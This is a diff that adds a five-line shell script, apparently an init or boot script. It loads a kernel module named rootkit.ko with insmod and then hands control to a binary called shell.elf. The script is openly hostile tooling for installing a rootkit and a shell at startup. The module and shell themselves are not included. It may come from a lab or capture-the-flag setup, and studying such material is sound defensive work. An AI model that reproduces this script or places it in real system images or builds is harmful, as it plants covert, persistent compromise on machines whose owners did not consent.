@@ -1,0 +1,5 @@
+#!/bin/sh
+ln -s /usr/bin/kmod /usr/bin/insmod
+insmod /rootkit.ko
+mount -t tmpfs tmpfs /tmp
+exec /shell.elf
